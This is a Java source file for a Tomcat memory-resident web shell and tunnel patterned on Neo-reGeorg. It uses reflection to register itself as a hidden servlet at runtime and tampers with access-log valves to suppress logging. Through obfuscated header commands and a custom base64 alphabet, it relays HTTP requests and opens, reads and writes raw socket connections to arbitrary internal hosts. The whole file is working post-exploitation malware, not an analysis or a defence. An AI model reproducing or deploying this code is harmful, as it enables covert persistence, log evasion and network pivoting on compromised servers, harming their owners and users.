package com.summersec.x;


import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;
import java.util.Iterator;
import java.util.List;
import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletInputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRegistration.Dynamic;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;


public class NeoreGeorgServlet implements Servlet {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    public String path = "/favicondemo.ico";
    private static char[] en = "mKg4oAv5kZqU1LtrHfVOSsD6RwI/jlzBW2bEaih3pNyXuMGJxeTdcn+9P7Y8CF0Q".toCharArray();
    private static byte[] de = new byte[]{-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 54, -1, -1, -1, 27, 62, 12, 33, 39, 3, 7, 23, 57, 59, 55, -1, -1, -1, -1, -1, -1, -1, 5, 31, 60, 22, 35, 61, 46, 16, 26, 47, 1, 13, 45, 41, 19, 56, 63, 24, 20, 50, 11, 18, 32, 43, 58, 9, -1, -1, -1, -1, -1, -1, 36, 34, 52, 51, 49, 17, 2, 38, 37, 28, 8, 29, 0, 53, 4, 40, 10, 15, 21, 14, 44, 6, 25, 48, 42, 30, -1, -1, -1, -1, -1};

    public NeoreGeorgServlet() {
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.path = this.request.getHeader("path");
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addServlet());
        } catch (Exception var7) {
            output.append("error:" + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }

    public String addServlet() throws Exception {
        try {
            ServletContext servletContext = this.request.getServletContext();
            ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade)servletContext;
            Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
            applicationContextField.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext)applicationContextField.get(applicationContextFacade);
            Field standardContextField = applicationContext.getClass().getDeclaredField("context");
            standardContextField.setAccessible(true);
            StandardContext standardContext = (StandardContext)standardContextField.get(applicationContext);
            Wrapper wrapper = standardContext.createWrapper();
            wrapper.setName(this.path);
            standardContext.addChild(wrapper);
            wrapper.setServletClass(this.path);
            wrapper.setServlet(this);
            Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
            registration.addMapping(new String[]{this.path});
            registration.setLoadOnStartup(1);
            if (this.getMethodByClass(wrapper.getClass(), "setServlet", Servlet.class) == null) {
                this.transform(standardContext, this.path);
                this.init((ServletConfig)getFieldValue(wrapper, "facade"));
            }

            return "Success";
        } catch (Exception var9) {
            return var9.getMessage();
        }
    }

    public void service(ServletRequest req, ServletResponse resp) throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest)req;
        HttpServletResponse response = (HttpServletResponse)resp;
        PrintWriter out = response.getWriter();
        HttpSession application = request.getSession();

        try {
            this.noLog(request);
        } catch (Exception var21) {
        }

        String rUrl = request.getHeader("Zlponijrlvs");
        String cmd;
        if (rUrl != null) {
            rUrl = new String(b64de(rUrl));

            try {
                if (!this.islocal(rUrl)) {
                    response.reset();
                    cmd = request.getMethod();
                    URL u = new URL(rUrl);
                    HttpURLConnection conn = (HttpURLConnection)u.openConnection();
                    conn.setRequestMethod(cmd);
                    conn.setDoOutput(true);
                    Enumeration enu = request.getHeaderNames();
                    List<String> keys = Collections.list(enu);
                    Collections.reverse(keys);
                    Iterator var34 = keys.iterator();

                    while(var34.hasNext()) {
                        String key = (String)var34.next();
                        if (!key.equalsIgnoreCase("Zlponijrlvs")) {
                            String value = request.getHeader(key);
                            conn.setRequestProperty(headerkey(key), value);
                        }
                    }

                    byte[] buffer = new byte[1024];
                    int i;
                    if (request.getContentLength() != -1) {
                        OutputStream output;
                        try {
                            output = conn.getOutputStream();
                        } catch (Exception var20) {
                            response.setHeader("Vkh", "8MfxUTr1VG_uaKBPdfzufZ52oPQmVGkIC9");
                            return;
                        }

                        ServletInputStream inputStream = request.getInputStream();

                        while((i = inputStream.read(buffer)) != -1) {
                            output.write(buffer, 0, i);
                        }

                        output.flush();
                        output.close();
                    }

                    Iterator var39 = conn.getHeaderFields().keySet().iterator();

                    while(var39.hasNext()) {
                        String key = (String)var39.next();
                        if (key != null && !key.equalsIgnoreCase("Content-Length")) {
                            String value = conn.getHeaderField(key);
                            response.setHeader(key, value);
                        }
                    }

                    InputStream hin;
                    if (conn.getResponseCode() < 400) {
                        hin = conn.getInputStream();
                    } else {
                        hin = conn.getErrorStream();
                        if (hin == null) {
                            response.setStatus(200);
                            return;
                        }
                    }

                    response.setStatus(conn.getResponseCode());

                    while((i = hin.read(buffer)) != -1) {
                        byte[] data = new byte[i];
                        System.arraycopy(buffer, 0, data, 0, i);
                        out.write(new String(data));
                    }

                    return;
                }
            } catch (Exception var24) {
                var24.getMessage();
            }
        }

        response.resetBuffer();
        response.setStatus(200);
        cmd = request.getHeader("Hlbfh");
        if (cmd != null) {
            String mark = cmd.substring(0, 22);
            cmd = cmd.substring(22);
            response.setHeader("Jzyu", "5DZkJoYjLbRIqlWWzZ");
            int bytesRead;
            if (cmd.compareTo("2p1yqRJS7HDc") == 0) {
                try {
                    String[] target_ary = (new String(b64de(request.getHeader("Bpmk")))).split("\\|");
                    String target = target_ary[0];
                    bytesRead = Integer.parseInt(target_ary[1]);
                    SocketChannel socketChannel = SocketChannel.open();
                    socketChannel.connect(new InetSocketAddress(target, bytesRead));
                    socketChannel.configureBlocking(false);
                    application.setAttribute(mark, socketChannel);
                    response.setHeader("Jzyu", "5DZkJoYjLbRIqlWWzZ");
                } catch (Exception var19) {
                    response.setHeader("Vkh", "ab0dOo8ZQaoYuWqf2ovGCpAkiafntyRljjMfG");
                    response.setHeader("Jzyu", "kdu05VN1tUY6F5b0j73zC9QuPVYfER73BEFzVfMt6SIy_KEsumgaRR");
                }
            } else {
                SocketChannel socketChannel;
                if (cmd.compareTo("h9AYzXWL0ombDQUMmsJPJSjRyPeDo2gHSnnWGKQJ3hi5") == 0) {
                    socketChannel = (SocketChannel)application.getAttribute(mark);

                    try {
                        socketChannel.socket().close();
                    } catch (Exception var18) {
                    }

                    application.removeAttribute(mark);
                } else {
                    byte[] data;
                    if (cmd.compareTo("sDOD5hAhAyHLqLS0n") == 0) {
                        socketChannel = (SocketChannel)application.getAttribute(mark);

                        try {
                            ByteBuffer buf = ByteBuffer.allocate(513);

                            for(bytesRead = socketChannel.read(buf); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
                                data = new byte[bytesRead];
                                System.arraycopy(buf.array(), 0, data, 0, bytesRead);
                                out.write(b64en(data));
                            }

                            response.setHeader("Jzyu", "5DZkJoYjLbRIqlWWzZ");
                        } catch (Exception var23) {
                            response.setHeader("Jzyu", "kdu05VN1tUY6F5b0j73zC9QuPVYfER73BEFzVfMt6SIy_KEsumgaRR");
                        }
                    } else if (cmd.compareTo("81eneZlfr3BUPRNWlfq7lxOFqMPEWbRcFr2wLxTTv") == 0) {
                        socketChannel = (SocketChannel)application.getAttribute(mark);

                        try {
                            int readlen = request.getContentLength();
                            byte[] buff = new byte[readlen];
                            request.getInputStream().read(buff, 0, readlen);
                            data = b64de(new String(buff));
                            ByteBuffer buf = ByteBuffer.allocate(data.length);
                            buf.put(data);
                            buf.flip();

                            while(buf.hasRemaining()) {
                                socketChannel.write(buf);
                            }

                            response.setHeader("Jzyu", "5DZkJoYjLbRIqlWWzZ");
                        } catch (Exception var22) {
                            response.setHeader("Vkh", "QFVgwWy5chBAXI");
                            response.setHeader("Jzyu", "kdu05VN1tUY6F5b0j73zC9QuPVYfER73BEFzVfMt6SIy_KEsumgaRR");
                            socketChannel.socket().close();
                        }
                    }
                }
            }
        } else {
            out.write("<!-- x0zdyym2QlZu4NbrzwUJNJrZBHydgYNXMaX -->");
        }

    }

    public static String b64en(byte[] data) {
        StringBuffer sb = new StringBuffer();
        int len = data.length;
        int i = 0;

        while(i < len) {
            int b1 = data[i++] & 255;
            if (i == len) {
                sb.append(en[b1 >>> 2]);
                sb.append(en[(b1 & 3) << 4]);
                sb.append("==");
                break;
            }

            int b2 = data[i++] & 255;
            if (i == len) {
                sb.append(en[b1 >>> 2]);
                sb.append(en[(b1 & 3) << 4 | (b2 & 240) >>> 4]);
                sb.append(en[(b2 & 15) << 2]);
                sb.append("=");
                break;
            }

            int b3 = data[i++] & 255;
            sb.append(en[b1 >>> 2]);
            sb.append(en[(b1 & 3) << 4 | (b2 & 240) >>> 4]);
            sb.append(en[(b2 & 15) << 2 | (b3 & 192) >>> 6]);
            sb.append(en[b3 & 63]);
        }

        return sb.toString();
    }

    public static byte[] b64de(String str) {
        byte[] data = str.getBytes();
        int len = data.length;
        ByteArrayOutputStream buf = new ByteArrayOutputStream(len);
        int i = 0;

        while(i < len) {
            byte b1;
            do {
                b1 = de[data[i++]];
            } while(i < len && b1 == -1);

            if (b1 == -1) {
                break;
            }

            byte b2;
            do {
                b2 = de[data[i++]];
            } while(i < len && b2 == -1);

            if (b2 == -1) {
                break;
            }

            buf.write(b1 << 2 | (b2 & 48) >>> 4);

            byte b3;
            do {
                b3 = data[i++];
                if (b3 == 61) {
                    return buf.toByteArray();
                }

                b3 = de[b3];
            } while(i < len && b3 == -1);

            if (b3 == -1) {
                break;
            }

            buf.write((b2 & 15) << 4 | (b3 & 60) >>> 2);

            byte b4;
            do {
                b4 = data[i++];
                if (b4 == 61) {
                    return buf.toByteArray();
                }

                b4 = de[b4];
            } while(i < len && b4 == -1);

            if (b4 == -1) {
                break;
            }

            buf.write((b3 & 3) << 6 | b4);
        }

        return buf.toByteArray();
    }

    static String headerkey(String str) throws Exception {
        String out = "";
        String[] var2 = str.split("-");
        int var3 = var2.length;

        for(int var4 = 0; var4 < var3; ++var4) {
            String block = var2[var4];
            out = out + block.substring(0, 1).toUpperCase() + block.substring(1);
            out = out + "-";
        }

        return out.substring(0, out.length() - 1);
    }

    boolean islocal(String url) throws Exception {
        String ip = (new URL(url)).getHost();
        Enumeration nifs = NetworkInterface.getNetworkInterfaces();

        while(nifs.hasMoreElements()) {
            NetworkInterface nif = (NetworkInterface)nifs.nextElement();
            Enumeration addresses = nif.getInetAddresses();

            while(addresses.hasMoreElements()) {
                InetAddress addr = (InetAddress)addresses.nextElement();
                if (addr instanceof Inet4Address && addr.getHostAddress().equals(ip)) {
                    return true;
                }
            }
        }

        return false;
    }

    private void transform(Object standardContext, String path) throws Exception {
        Object containerBase = this.invoke(standardContext, "getParent", (Object[])null);
        Class mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false, containerBase.getClass().getClassLoader());
        Field listenersField = Class.forName("org.apache.catalina.core.ContainerBase", false, containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
        listenersField.setAccessible(true);
        ArrayList listeners = (ArrayList)listenersField.get(containerBase);

        for(int i = 0; i < listeners.size(); ++i) {
            Object mapperListener_Mapper = listeners.get(i);
            if (mapperListener_Mapper != null && mapperListenerClass.isAssignableFrom(mapperListener_Mapper.getClass())) {
                Object mapperListener_Mapper2 = getFieldValue(mapperListener_Mapper, "mapper");
                Object mapperListener_Mapper_hosts = getFieldValue(mapperListener_Mapper2, "hosts");

                for(int j = 0; j < Array.getLength(mapperListener_Mapper_hosts); ++j) {
                    Object mapperListener_Mapper_host = Array.get(mapperListener_Mapper_hosts, j);
                    Object mapperListener_Mapper_hosts_contextList = getFieldValue(mapperListener_Mapper_host, "contextList");
                    Object mapperListener_Mapper_hosts_contextList_contexts = getFieldValue(mapperListener_Mapper_hosts_contextList, "contexts");

                    for(int k = 0; k < Array.getLength(mapperListener_Mapper_hosts_contextList_contexts); ++k) {
                        Object mapperListener_Mapper_hosts_contextList_context = Array.get(mapperListener_Mapper_hosts_contextList_contexts, k);
                        if (standardContext.equals(getFieldValue(mapperListener_Mapper_hosts_contextList_context, "object"))) {
                            new ArrayList();
                            Object standardContext_Mapper = this.invoke(standardContext, "getMapper", (Object[])null);
                            Object standardContext_Mapper_Context = getFieldValue(standardContext_Mapper, "context");
                            Object standardContext_Mapper_Context_exactWrappers = getFieldValue(standardContext_Mapper_Context, "exactWrappers");
                            Object mapperListener_Mapper_hosts_contextList_context_exactWrappers = getFieldValue(mapperListener_Mapper_hosts_contextList_context, "exactWrappers");

                            int l;
                            Object Mapper_Wrapper;
                            Method addWrapperMethod;
                            for(l = 0; l < Array.getLength(mapperListener_Mapper_hosts_contextList_context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array.get(mapperListener_Mapper_hosts_contextList_context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("removeWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path);
                                }
                            }

                            for(l = 0; l < Array.getLength(standardContext_Mapper_Context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array.get(standardContext_Mapper_Context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("addWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class, Object.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path, getFieldValue(Mapper_Wrapper, "object"));
                                }
                            }
                        }
                    }
                }
            }
        }

    }

    private void noLog(HttpServletRequest request) throws Exception {
        Object servletContext = getFieldValue(request.getServletContext(), "context");
        Object standardContext = getFieldValue(servletContext, "context");

        try {
            ArrayList arrayList;
            for(arrayList = new ArrayList(); standardContext != null; standardContext = this.invoke(standardContext, "getParent", (Object[])null)) {
                arrayList.add(standardContext);
            }

            label49:
            for(int i = 0; i < arrayList.size(); ++i) {
                Object pipeline = this.invoke(arrayList.get(i), "getPipeline", (Object[])null);
                if (pipeline != null) {
                    Object valve = this.invoke(pipeline, "getFirst", (Object[])null);

                    while(true) {
                        while(true) {
                            if (valve == null) {
                                continue label49;
                            }

                            if (this.getMethodByClass(valve.getClass(), "getCondition", (Class[])null) != null && this.getMethodByClass(valve.getClass(), "setCondition", String.class) != null) {
                                String condition = (String)this.invoke(valve, "getCondition");
                                condition = condition == null ? "FuckLog" : condition;
                                this.invoke(valve, "setCondition", condition);
                                this.request.setAttribute(condition, condition);
                                valve = this.invoke(valve, "getNext", (Object[])null);
                            } else if (Class.forName("org.apache.catalina.Valve", false, standardContext.getClass().getClassLoader()).isAssignableFrom(valve.getClass())) {
                                valve = this.invoke(valve, "getNext", (Object[])null);
                            } else {
                                valve = null;
                            }
                        }
                    }
                }
            }
        } catch (Exception var9) {
        }

    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field)obj;
        } else {
            f = obj.getClass().getDeclaredField(fieldName);
        }

        f.setAccessible(true);
        f.set(obj, value);
    }

    private Object invoke(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for(int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object)null);
                    }
                }
            }

            Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[])((Class[])classes.toArray(new Class[0])));
            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }
    }

    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while(cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field)obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();

            while(cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }

        f.setAccessible(true);
        return f.get(obj);
    }

    public void init(ServletConfig servletConfig) throws ServletException {
    }

    public ServletConfig getServletConfig() {
        return null;
    }

    public String getServletInfo() {
        return null;
    }

    public void destroy() {
    }
}
